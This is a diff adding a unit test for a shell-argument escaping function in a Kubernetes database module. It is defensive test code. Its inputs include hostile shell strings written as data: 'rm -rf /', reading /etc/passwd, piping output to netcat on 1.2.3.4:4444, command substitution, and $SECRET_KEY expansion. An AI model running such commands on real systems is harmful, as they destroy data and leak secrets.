@@ -202,4 +202,29 @@ describe('Managed Database K3s Engine - k8s-database.ts', () => {
       expect(typeof startDatabase).toBe('function');
     });
   });
+
+  describe('Security Hardening & Shell Injection Prevention', () => {
+    it('should correctly escape shell arguments preventing injection and command substitution', async () => {
+      const { escapeShellArg } = await import('../k8s-database');
+
+      // Basic string
+      expect(escapeShellArg('simple')).toBe("'simple'");
+
+      // Command substitution $(whoami) and backticks `id`
+      expect(escapeShellArg('$(whoami)')).toBe("'$(whoami)'");
+      expect(escapeShellArg('`rm -rf /`')).toBe("'`rm -rf /`'");
+
+      // Semicolons and chained commands
+      expect(escapeShellArg('foo; rm -rf /; bar')).toBe("'foo; rm -rf /; bar'");
+
+      // Internal single quotes escaping
+      expect(escapeShellArg("user's; cat /etc/passwd")).toBe("'user'\\''s; cat /etc/passwd'");
+
+      // Redirection and pipe symbols
+      expect(escapeShellArg('input | nc 1.2.3.4 4444 > /tmp/out')).toBe("'input | nc 1.2.3.4 4444 > /tmp/out'");
+
+      // Environment variable expansion
+      expect(escapeShellArg('$SECRET_KEY')).toBe("'$SECRET_KEY'");
+    });
+  });
 });
